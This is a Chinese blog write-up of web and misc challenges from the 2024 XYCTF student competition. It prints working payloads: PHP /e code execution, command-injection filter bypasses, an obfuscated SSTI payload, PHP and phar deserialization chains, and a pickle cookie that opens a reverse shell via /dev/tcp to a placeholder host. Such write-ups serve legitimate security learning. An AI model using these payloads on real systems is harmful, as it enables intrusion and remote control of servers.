---
title: 2024XYCTFの部分wp详解
date: 2024-04-27 10:45:22
updated: 2024-04-27 10:45:22
tags:
  - Web
  - Misc
  - CTF
categories: CTF Write Up
cover: https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/83776a4079fc052d284173c78b0c838c.jpeg
description: XYCTF中的Web、Misc部分write up
mathjax: true
---

在大二下打的第一场（其实并不是第一场，只是之前都没成绩\爆零）CTF，属于新生赛级别（没办法大的也打不动，而且我大二上才加入校队勉强也算新人……吧），但是题目量大管饱（100多道），也确实学到了新东西，比起常年坐牢爆零的大比赛来说对个人的能力培养反而更多。

XYCTF中我主要是在隶属于校队的Xp0int战队中解题，虽说是校队公共账号但是老人都不会出手，基本都是几个新生在折腾。也一度取得了第一名的位置霸榜了几天，但最后一周因为各种安排导致腾不出手打比赛解新题又滑落到了第五的位置，实属惋惜。

![echarts](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/echarts.svg?x-oss-process=style/blog)

不过反正是新生赛，也不会有多大含金量就是了，姑且还是记录一下这次比赛的成果吧。

# Web

## 5.1 ez!Make

## 5.2 ezmd5

利用fastcoll生成两个md5值相同的图片即可

## 5.3 EZHTTP

robots.txt可以看到有个l0g1n.txt，里面存着账号和密码

username: XYCTF

password: @JOILha!wuigqi123$

登进去之后说要从yuanshen.com来，伪造IP

用client-ip可以伪造

现在需要伪造代理

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NjY2YzQ4NjEwM2I5YjZmMGUyODViOTVmMzM5OGYyYWJfaFEyU1pDQUNYbmQ5MlZOWGdTU1BZbG9TVDYzVWdEYWhfVG9rZW46QWc2MmJDa3Vnb25pYVJ4MndtY2NDMmNpbnVkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

我忘了咋伪造了……

噢用via可以

没了

```Plain
POST /index.php HTTP/1.1
Host: xyctf.top:38102
User-Agent: XYCTF
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: http://xyctf.top:38102
Connection: close
Referer: yuanshen.com
Client-ip: 127.0.0.1
Via: ymzx.qq.com
Cookie: XYCTF
Upgrade-Insecure-Requests: 1

username=XYCTF&password=%40JOILha%21wuigqi123%24
```

## 5.4 Warm up

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWMzZTM2ZTQ1YWVjMjhiMzNlNmNmMmU5OWI2MDkwNmNfUGJGUTJFa2FYMGMxZVBZQzBobVgzQmRLajhtQ0NoMlRfVG9rZW46SzVPMGJsTWxab0FvN3Z4bkh0cmNyZzFSbkpoXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

Payload:http://xyctf.top:40339/?val1=QNKCDZO&val2=240610708&md5=0e215962017&XY=QNKCDZO&XYCTF=QNKCDZO

之后跳转到/LLeeevvveeelll222.php

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWZmZDY3Y2RkZjk2ZTk1NzRiM2VkOGFiMTAyNmY4ZDhfcENpSHhkaVd0ZVdGaEV5S3NnWmIzeUdpa2xSYllrUlhfVG9rZW46R3VEcmJYWXJFbzVEZEN4TW94ZWNVcWVybmRnXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

好像可以xss，但我不会弹flag啊o(╥﹏╥)o

好吧，这题不是xss，使用preg_match的/e命令执行

```Plain
Payload：http://xyctf.top:40339/LLeeevvveeelll222.php?a=/123/e&b=system('cat /flag');&c=123
post：a[]=e
```

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NWI5ZjhjZmI2MmM4Mjk3MmE4YzAzYmRhMTliZmViOWJfQUpRdG16Ulh5b3N6Y2JOTU9KM0RtNndUTjYxTDh6dzRfVG9rZW46U0NHcGJMaUJab2xkUkV4bk5FZmNSWllvbmRlXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

## 5.5 牢牢记住，逝者为大

payload:?cmd=%0A`$_GET[1]`;%23&1=sh -c $'\143\141\164\40\57\146\154\141\147\40\76\40\61\56\160\150\160'         

%0A换行，%23注释掉后面的mamba out，``执行命令但不回显，$_GET[1]用于绕过长度限制，1参数后的命令执行通过八进制绕过/bin|mv|cp|ls|\||f|a|l|\?|\*|\>/i的过滤，接着直接访问1.php得到flag

## 5.6 ezMake

## 5.7 ez?Make

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDgxN2MwNThlNzU0MWI0NWMxMjQ4YzJiZjYwNGYzYjBfS3IxOEJJTkFzdEVVR2psMDhxMTBiTWJiNk9xbkFaTlpfVG9rZW46U29TM2JDMXZ2bzUzcXd4cUc5VWNSZ1VWbmpjXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

## 5.8 ezPoP

```Bash
<?php
class   Flag {
    public $token;
    public $password;
}

$flag = new Flag();

$flag->password = &$flag->token;

$serialize = serialize($flag);

echo $serialize;

//O:4:"Flag":2:{s:5:"token";N;s:8:"password";R:2;}
<?php
class A {
    public $mack;
}

class B {
    public $luo;
}

class C {
    public $wang1;
}


class D {
    public $lao;
    public $chen;
}

class E {
    public $name;
    public $num;
}

$c = new C();
$a = new A();
$a->mack = $c;
$b = new B();
$b->luo = $a;
$d = new D();
$d->lao = $b;
$e = new E();
$e->num=$d;
$serialize = serialize($e);
echo $serialize;

//pop=O:1:"E":2:{s:4:"name";N;s:3:"num";O:1:"D":2:{s:3:"lao";O:1:"B":1:{s:3:"luo";O:1:"A":1:{s:4:"mack";O:1:"C":1:{s:5:"wang1";N;}}}s:4:"chen";N;}}
<?php
class XYCTFNO1
{
    public $Liu;
    public $T1ng;
    private $upsw1ng;
}

class XYCTFNO2
{
    public $crypto0;
    public $adwa;
}

class XYCTFNO3
{
    public $KickyMu;
    public $fpclose;
    public $N1ght = "Crypto0";
}

$XYCTFNO1 = new XYCTFNO1();
$XYCTFNO1->T1ng = "yuroandCMD258";
$XYCTFNO1->crypto0 = "dev1l";
$XYCTFNO2 = new XYCTFNO2();
$XYCTFNO2->adwa = $XYCTFNO1;
$XYCTFNO3 = new XYCTFNO3();
$XYCTFNO3->N1ght = "oSthing";
$XYCTFNO3->KickyMu = $XYCTFNO2;

$serialize = urlencode(serialize($XYCTFNO3));
echo $serialize;

//O%3A8%3A%22XYCTFNO3%22%3A3%3A%7Bs%3A7%3A%22KickyMu%22%3BO%3A8%3A%22XYCTFNO2%22%3A2%3A%7Bs%3A7%3A%22crypto0%22%3BN%3Bs%3A4%3A%22adwa%22%3BO%3A8%3A%22XYCTFNO1%22%3A4%3A%7Bs%3A3%3A%22Liu%22%3BN%3Bs%3A4%3A%22T1ng%22%3Bs%3A13%3A%22yuroandCMD258%22%3Bs%3A17%3A%22%00XYCTFNO1%00upsw1ng%22%3BN%3Bs%3A7%3A%22crypto0%22%3Bs%3A5%3A%22dev1l%22%3B%7D%7Ds%3A7%3A%22fpclose%22%3BN%3Bs%3A5%3A%22N1ght%22%3Bs%3A7%3A%22oSthing%22%3B%7D
```

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjhhNTkyZjdkYTg5Njg4OGM2YmI3MTdjZjRiYzcxYWZfMTJjTXZ6TXNTQnJMRzI2TzRkcWZNd2gyQW00eU50WHBfVG9rZW46VTJwVWJ2WmpHb09pejZ4N21xZGM3UXpWbko3XzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

## 5.9 我是一个复读机

开局弱口令爆破，密码是asdqwe

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NTEwNWYxZDM5M2QxZGRjMjA5OGZiOWZjMTQ3MTZlY2VfaW1iSzZQSTdENHFLZjQzeWRCREhxV3pmQllvM0U1Sm1fVG9rZW46TVV2dGIzODFBb0JjZ1h4Q0RQN2NGTlo5bjh1XzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

然后可以看到第二级页面

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MjNhNGE3YTdjMTNjN2QwMzAxNjE0ODJkY2ZlM2IyMGRfUVRQNWIxalhJNFhoNFhFWTlhRTNuUVdFVWtxNzAxYkdfVG9rZW46V05PcWJVUnNtb0pLcDV4UzFMV2NwWFhJbkFkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

尝试输入{{7*7}}发现大括号被过滤了

其实不是大括号被过滤，输入框默认已经被大括号扩住了，确定是SSTI注入

用fenjing一把梭

payload如下

```Python
说%print (g.pop|attr(lipsum|escape|batch(22)|list|first|last*2+dict(GLOBALS=x)|first|lower+lipsum|escape|batch(22)|list|first|last*2)|attr(lipsum|escape|batch(22)|list|first|last*2+dict(GETITEM=x)|first|lower+lipsum|escape|batch(22)|list|first|last*2)(lipsum|escape|batch(22)|list|first|last*2+dict(BUILTINS=x)|first|lower+lipsum|escape|batch(22)|list|first|last*2)|attr(lipsum|escape|batch(22)|list|first|last*2+dict(GETITEM=x)|first|lower+lipsum|escape|batch(22)|list|first|last*2)(lipsum|escape|batch(22)|list|first|last*2+dict(IMPORT=x)|first|lower+lipsum|escape|batch(22)|list|first|last*2))(dict(OS=x)|first|lower).popen((((dict(((0,1),(0,1)))|replace(1|center|first,x)|replace(1,dict(c=x)|join)).format(37)+dict(c=x)|join)*9)%(99,97,116,32,47,102,108,97,103)).read()%
```

## 5.10 ezRCE

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmFmNGY3NTUyOWJjZjVkOTI5YTllNTYyZWQxN2FjNDhfNFg1WnFkbkZjWXJRb1BHRVN1SXZVWHE1YVUzcmxlREFfVG9rZW46QklDN2J3OUIxbzQ1blp4TTRDbGNESnVSblVmXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60

## 5.11 ezSerialize

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGZiYzBhNDQ3YmUwNTM5ZGY3ZDg1NzlhNTFjNGVlMmNfbzdNZjRyc08wTFV2bm9oNGtOUmxIa3hYV0ZXRTFLeEtfVG9rZW46VmdKQ2JDdUZTb1oyNXB4Q0s4dmNINDNYbmRkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

/?pop=O:4:"Flag":2:{s:5:"token";s:3:"111";s:8:"password";R:2;}

跳转/fpclosefpclosefpcloseffflllaaaggg.php

```Bash
<?php
highlight_file(__FILE__);
class A {
    public $mack;
    public function __invoke()//调用不可访问的方法时，__invoke() 方法会被调用。
    {
        $this->mack->nonExistentMethod();//这里会调用__call()方法
    }
}

class B {
    public $luo;
    public function __get($key){//当调用不可访问的属性时，__get() 会被调用。
        echo "o.O<br>";
        $function = $this->luo;
        return $function();//这里会调用__invoke()方法
    }
}

class C {
    public $wang1;

    public function __call($wang1,$wang2)//当调用不可访问的方法时，__call() 会被调用。
    {
        include 'flag.php';
        echo "flag2";//这里就是最终的flag
    }
}


class D {
    public $lao;
    public $chen;
    public function __toString(){//当一个类被当成字符串时，__toString() 方法会被调用。
        echo "O.o<br>";
        return is_null($this->lao->chen) ? "" : $this->lao->chen;//这里会调用__get()方法
    }
}

class E {
    public $name = "xxxxx";
    public $num;

    public function __unserialize($data)//当调用未定义的序列化方法时，__unserialize() 会被调用。
    {
        echo "<br>学到就是赚到!<br>";
        echo $data['num'];//这里会调用__wakeup()方法和__toString()方法
    }
    public function __wakeup(){//当对象被反序列化时，会调用 __wakeup() 方法。
        if($this->name!='' || $this->num!=''){
            echo "旅行者别忘记旅行的意义!<br>";
        }
    }
}

if (isset($_POST['pop'])) {
    unserialize($_POST['pop']);
}

//E-->D-->B-->A-->C
$a=new E();
$b=new D();
$c=new B();
$d=new A();
$e=new C();
$a->num=$b;
$a->name=$b;
$b->lao=$c;
$b->chen=null;
$c->luo=$d;
$d->mack=$e;
echo serialize($a);
//unserialize('O:1:"E":2:{s:4:"name";s:5:"xxxxx";s:3:"num";O:1:"D":2:{s:3:"lao";O:1:"B":1:{s:3:"luo";O:1:"A":1:{s:4:"mack";O:1:"C":1:{s:5:"wang1";N;}}}s:4:"chen";N;}}');
```

不知道为什么本地ide可以实现反序列化但是在部署在网站后__unserialize魔术方法就无法被触发，网上也查不到，晕……

老缠，我直接把name也改了，在wakeup里触发tostring吧

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGMwNjgwYjQwZjQ2MDA0ZmI4MmFkOGFiZGQ2MDFiMjJfWmJoNkZRRHBIVnFkeVhINVpsTXc3YWlMRkJKSVRMa1FfVG9rZW46U1N2OWJGQVpJb010dU54WTF6RWNqWnQwblNiXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

跳转到/saber_master_saber_master.php

月批的丑态……

```Bash
<?php

//error_reporting(0);
highlight_file(__FILE__);
define('Showmaker', 'unknown');
// flag.php
class XYCTFNO1
{
    public $Liu;
    public $T1ng;
    private $upsw1ng;

    public function __construct($Liu, $T1ng, $upsw1ng = Showmaker)//__construct() 方法用于初始化对象的属性,在对象被创建时自动调用
    {
        $this->Liu = $Liu;
        $this->T1ng = $T1ng;
        $this->upsw1ng = $upsw1ng;
    }
}

class XYCTFNO2
{
    public $crypto0;
    public $adwa;

    public function __construct($crypto0, $adwa)
    {
        $this->crypto0 = $crypto0;
    }

    public function XYCTF()
    {
        if ($this->adwa->crypto0 != 'dev1l' or $this->adwa->T1ng != 'yuroandCMD258') {
            return False;
        } else {
            return True;
        }
    }
}

class XYCTFNO3
{
    public $KickyMu;
    public $fpclose;
    public $N1ght = "Crypto0";

    public function __construct($KickyMu, $fpclose)
    {
        $this->KickyMu = $KickyMu;
        $this->fpclose = $fpclose;
    }

    public function XY()
    {
        if ($this->N1ght == 'oSthing') {
            echo "WOW, You web is really good!!!\n";
            echo new $_POST['X']($_POST['Y']);
        }
    }

    public function __wakeup()
    {
        if ($this->KickyMu->XYCTF()) {
            $this->XY();
        }
    }
}


if (isset($_GET['CTF'])) {
    unserialize($_GET['CTF']);
}

////03-->02-->01
$XYCTF01=new XYCTFNO1('dev1l', 'yuroandCMD258');
$XYCTF01->crypto0="dev1l";

$XYCTF02=new XYCTFNO2($XYCTF01,"adwa");
$XYCTF02->adwa=$XYCTF01;
$a=new XYCTFNO3($XYCTF02, "useless");
$a->N1ght="oSthing";
echo serialize($a);
unserialize(serialize($a));
```

payload如下：?CTF=O:8:"XYCTFNO3":3:{s:7:"KickyMu";O:8:"XYCTFNO2":2:{s:7:"crypto0";O:8:"XYCTFNO1":4:{s:3:"Liu";s:5:"dev1l";s:4:"T1ng";s:13:"yuroandCMD258";s:17:" XYCTFNO1 upsw1ng";s:7:"unknown";s:7:"crypto0";s:5:"dev1l";}s:4:"adwa";r:3;}s:7:"fpclose";s:7:"useless";s:5:"N1ght";s:7:"oSthing";}

X=SplFileObject&Y=php://filter/read=convert.base64-encode/resource=/flag.sh

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI4YTg1OTE4MTU0NDFjNTNmZTQyOWYzNTM3NTU0ZTdfOEN2b095bGI5bXZ4OWpUUko5dTNVcm4wOW95Y05aZ2pfVG9rZW46TEVyeWJZUWFrb3NiSVF4aXpBRGNKN0JubndUXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmE0NGVlZmE1YTBmMDNkMjA5NTViZTM1ZTlkNjM0OTFfb0w0bkRiUlVXQXV0YjBWT0xGNW90OWlqMEJnZUQwYjhfVG9rZW46SHpOcGJZa0tFb1RCRVN4SGFzYmNPdlpkbk52XzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

```Bash
#!/bin/sh

# Get the user
user=$(ls /home)

# Check the environment variables for the flag and assign to INSERT_FLAG
if [ "$DASFLAG" ]; then
    INSERT_FLAG="$DASFLAG"
    export DASFLAG=no_FLAG
    DASFLAG=no_FLAG
elif [ "$FLAG" ]; then
    INSERT_FLAG="$FLAG"
    export FLAG=no_FLAG
    FLAG=no_FLAG
elif [ "$GZCTF_FLAG" ]; then
    INSERT_FLAG="$GZCTF_FLAG"
    export GZCTF_FLAG=no_FLAG
    GZCTF_FLAG=no_FLAG
else
    INSERT_FLAG="flag{TEST_Dynamic_FLAG}"
fi

# å°FLA
```

这玩意好像是生成flag的脚本……

其实应该爬flag.php的

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWExOTBlZDA2NjBhMmFiMWQyOWU4NWJjOGIzZDRiNzhfNmNGaUx3Ymt0Y0tWYjU4enkyT1lNTE9SRU5DOW0zTVlfVG9rZW46TXVDMmJ4b2tUb1VaR1R4c2hQTWNPUDU2bmxkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

## 5.12 pharme

老缠题目

查看源码可以发现class.php

```Bash
<?php 
error_reporting(0); 
highlight_file(__FILE__); 
class evil{ 
    public $cmd; 
    public $a; 
    public function __destruct(){ 
        if('ch3nx1' === preg_replace('/;+/','ch3nx1',preg_replace('/[A-Za-z_\(\)]+/','',$this->cmd))){ 
            eval($this->cmd.'isbigvegetablechicken!'); 
        } else { 
            echo 'nonono'; 
        } 
    } 
} 

if(isset($_POST['file'])) 
{ 
    if(preg_match('/^phar:\/\//i',$_POST['file'])) 
    { 
        die("nonono"); 
    } 
    file_get_contents($_POST['file']); 
} 
```

思路就是上传一个phar文件，然后存在敏感函数file_get_contents，对其用phar伪协议解压时可以触发反序列化。

生成phar文件的脚本：

```Bash
<?php
class evil{
    public $cmd;
    public $a;
    public function __destruct(){
        if('ch3nx1' === preg_replace('/;+/','ch3nx1',preg_replace('/[A-Za-z_\(\)]+/','',$this->cmd))){
            eval($this->cmd.'isbigvegetablechicken!');
        } else {
            echo (preg_replace('/;+/','ch3nx1',preg_replace('/[A-Za-z_\(\)]+/','',$this->cmd)));
            echo "\n".'nonono';
        }
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new evil();
$o->cmd = 'highlight_file(array_rand(array_flip(scandir(getcwd()))));__HALT_COMPILER();';
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

但是题目有几层waf

1. 题目过滤了.gz，.phar之类的后缀
2. 题目过滤了文件中的__HALT_COMPILER();，这是phar文件的识别标志
3. POST传入file时过滤了开头为phar的字符串
4. evil类过滤了cmd参数，要求传入无参数命令执行，且被拼接了脏数据

依次可以采取以下步骤绕过：

1. 更改后缀为.gif，因为phar文件识别只看文件中的__HALT_COMPILER();标志而不看后缀，改后缀即可上传
2. 在linux中用gzip指令处理phar文件即可，phar伪协议也可以解压.gz文件
3. 用其他伪协议绕过，比如compress.zlib://phar://也可以实现phar解压
4. 构造payload`highlight_file(array_rand(array_flip(scandir(getcwd()))));__HALT_COMPILER();`。前者可以随机读取当前目录的文件，再用__HALT_COMPILER();阻止eval读入拼接的脏数据。

然后一直刷新就有概率爆flag。

这题傻逼的地方在于目录底下有20多个无关文件，搞起我一直刷新刷不出flag以为是方法错了破防了。其实多刷新几次就可以爆flag。

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVjOGEyMDc2NDc5YTU4MzI5YWZjZDQwMTFjNDJmZjdfenJkRnhWRUZFTHd1R1lrMGRIVjA4amppZkp1RlRYRkVfVG9rZW46RTQ2dWJydkp3b2lBT0x4dmJ2ZGN5RFpZbkdmXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

## 5.13 连连看

https://github.com/synacktiv/php_filter_chain_generator

用里面的脚本 尾部加一个<

然后再filter链的最后加多个 |string.strip_tags

## 5.14 login

打开看见一个login界面，猜测有register界面，发现真有，注册一下，登录进去，发现有一个重定向，点击后跳转到一个hello world的主界面，抓包看一下，发现cookie是base64编码，解码发现是pickle序列化的形式，应该就是pickle反序列化，经过测试一下，发现过滤了字符r，也就是不能用R指令，那我们用其他指令即可

```Python
import base64
op='''V__setstate__
(S"bash -c 'bash -i >& /dev/tcp/X.X.X.X/port 0>&1'"
ios
system
.'''
print(base64.b64encode(op.encode()))
```

把网页主页的cookie改为这个脚本生成的payload，再拿服务器反弹shell即可

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NlNjRhZDM2ZjNlYWEzZTA4ODAwOGNmNzkzM2MyNTRfakpnRFdqMm5JWmlJRVlIT2VNb1FvWnJreDlvMkNGaUlfVG9rZW46U2xYWGJqcXQ4b1VjQWJ4WUw4amM3TUVTbnpnXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGQzZGQ5NWZhYTAzMDM0MWZlZDA0OTgyY2Y5MWUwNzZfaHlVZVZsVTFNa28yT0dFaVlHQTk2Q3ZjUEMxd2dMTTBfVG9rZW46R2ZRZGJ2QmVqb3ZmVEF4Vnd0Q2NOZkVnbmtkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

## 5.15 ezClass

## 5.16 **εZ?¿м@Kε¿?**

在makefile中，\$<可以代表一个目标规则中第一个依赖文件的名称，在这里即代表了/flag文件，用<可以将文件内容重定向到标准输出，而用\$()可以替换括号里面的变量值，这里的\$(<$<),就是将/flag文件里面内容重定向到标准输出并且用\$()将其替换出来

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzYzNjc2MjYyM2Y0MTBiZWVmZDIyYjFiZmM0MzA0NWZfeGxTY0FVQmNYVXdnNlE1d1ZEYUVSNUVqaXk4ejMwdnJfVG9rZW46R0hpVWJob3RUb25iZ3p4SEN3QWNzQVJSbndiXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA)

# Misc

## 1.1 game

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYxMjI1YWExMDNhZTQ3MjdmNzdjMDhlOTg0NGQ4MzJfdThSbUFFcUNQOUM5ZERxZ0lraU9yNDdtV0VoaHhLcXlfVG9rZW46Vk0zeGJaVzY3bzBQTW94R0xDOWNzR3Vmbk1iXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

谷歌识图就出了

## 1.2 熊博士

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWM2YTNjMjA3MTgxYzQwMjM5NTkxMmZjNjhiN2IzODNfZDZVY3RvNGo5WXNod3pNMGJoNVZyMUtYVXpxOG92WXNfVG9rZW46QUl0bmJjR01Ub0ZCOUl4VDNNa2NYWlNCbmJmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

熊博士即熊斐特的埃特巴什码

## 1.3 彩蛋

在比赛须知页面130131103124106173164150151163137141137

三个一组八进制转

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MzdlZjQxNGIxMWRmZWVjZjU0YTgwOGViN2JjNjU3YTRfMkpIUE1xYmU2WFlTSXYxbU14S3FiZDN4dkRIUlFWS2NfVG9rZW46U3B1VGI5VnRtb3ltMTh4ZHF3VWNkeTdqbkNkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

在footer11001101101001110111011001001011111110100111101001111101

6个一组二进制转

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQ1NmZmNmQ4MTczNmY3OTJmYzdjNjU1ZjJkMDYyMDNfaWNnMGRxSmFCTkZYNUEzV2RQMDhXaDlHWnY0OW5NWE5fVG9rZW46QWd0RWJjdHRJb0ZMVnR4QVBHcGNFeUx1bmxjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

保存全站唯一一张图片，poster，到网站里改个格式，改为png，放到zsteg里面解析(LSB也可以)，发现keyboard：

xn0jtxgoy.p{urp{lbi{abe{c{ydcbt{frb{jab{

丢随波逐流里面解一下

bl0ckbuster_for_png_and_i_think_yon_can

XYCTF{this_a_bl0ckbuster_for_png_and_i_think_yon_can_find_it}

真能藏

## 1.4 zzl的护理小课堂

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTY3NWZiYWIxNzU0NGNmOWQyZjNmNTZlYTEzZDI0YTFfcDhEekhyMExuazNEQ3hEVFA1eWJrbDFGT1Bjc3pHelFfVG9rZW46VTZGU2JDM0RYb1pCZ2Z4VTN5OGNrSnhjbnVoXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

直接在控制台里把发送flag的函数扔进去就行

## 1.5 ez_隐写

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MmVhNTRlYzEyNmM2MzRiNjg3NmIxNTI1ZDFmMTUzZWRfYnlnYkZ1MkVjOGRxTGtyeEVIMlhvamNkNDB1S1lxVWpfVG9rZW46RzIwaWIxUzAxb1FtNEV4QmNBcWM1QXpCbmpkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

伪加密的zip，但是修改标志区后用winrar也打不开，用7z打开了

hint图片打不开，另一个压缩包是真加密

怀疑图片宽高有问题，爆破一下crc，得到真正的宽高是5120x2880，修改后打开得到

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=M2I0ZTFkMzEwZTY5MjMwMzM4Mzg0MjRiNGEyNjkyN2VfdWpEOFRYRzhkSEdzc3V1RGIyV1hmZXpob3BVNkhqZDBfVG9rZW46RThhcWJOMW52bzBFWDZ4NHllYWN4QkJkbk5lXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

估计是压缩包密码，20240401，得到另一张图，binwalk没有东西。推测是水印。

用blindwatermark解码，这图片也太糊了看不清flag

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGI4ZThmNmJkOTFmOTU3YjZhN2QwYzRlOWYzNjIzNjVfOU5uaXU0aThianNHYlJST0ZqaWdoTmFEakw1Q0htYXhfVG9rZW46RU1EUGJGRkFmb2Z0Ym94ZUdia2NjcTlLbjJkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

换了个工具watermark，吾爱可以下载

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZiNmVkZmU4Y2ZhZmFhN2EyZTVmNzkyNDhhMTMzZmVfU09LQWVMSHdYUTNrSVQ5empBYmhuR1JGOGY1Tk44ZzRfVG9rZW46TjJ4SmI4YWtDb2VCTGR4WmFnZ2NEVUFNbjFkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

## 1.6 zip神之套

第一层

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTZkNjUzZWI1ZjU0OWFhYmFjM2VhZDI3NWNiNDk0MjJfaXpzeGttTGNuTXYxWUJFeUNJM2g4YTdoRWJCdlB5ajJfVG9rZW46WW9SYWJIWG9Jb2JLVnp4a2tZbWNRY29LbktmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NTI5NjJhOGQ4YTFiYmY0MTY5MWFjYWY1NGQxMzAxM2JfRDBsYXFrVVZ1dElBdG9IOE5IbzFkRENOTVo3Z2xtNzJfVG9rZW46SWJuc2I2MHJZb21SV3l4ejlUM2N1Y0FybmNlXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

第二层压缩密码需要爆破，掩码应该长这样，apchr爆破得到xyctf20240401ftcyx

第二层

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NDk3ZTc5ZTcxZGJjY2RmMDlhMDdjNTc2NjFkZTRkOGVfWXpyUllWU1NOcm1hNUdkT204SkljMWxUSHlDTFBUMFJfVG9rZW46QzRFU2JOVlpzbzJGWEJ4U2ZlTmNLanJIbmFjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

套.zip

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDUwNjRmNGNmNDI3NTVmNmNlM2RlYTM3ZWJkOTY1MGRfSXdlOTF3dnhadnZEQ2UxMmtMOEZnMWdaVEdvWEZTMUpfVG9rZW46U0lKY2JYQm1vb3FYa1h4U0VvR2NZSThCbkxiXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

flag.zip

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=N2ExODU5YmYwNDg0YmM4MzVhZjgyODY2ZmY3MGU4NTVfRlFtVUN4djhXMWJQYXJBVUJJV1J2a0tVZUpoc0RLTEdfVG9rZW46WjBIbmJaOG5Ib1JVYXJ4ZVhSZmNmNnFKbnVkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

除了一个md文件，其他一毛一样，所以用，明文碰撞解密

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmM5NzMzMzdjMjYzZDEzMmUzNjQ5MzVmMWE4NDZiMjRfeGVWZDdObGNQQ29qcUNHNVJncVVqWTJBN3hiZTlZSDZfVG9rZW46Q3JOY2JDeHN6bzBEeDl4NE12SGN3VGZvbjdmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

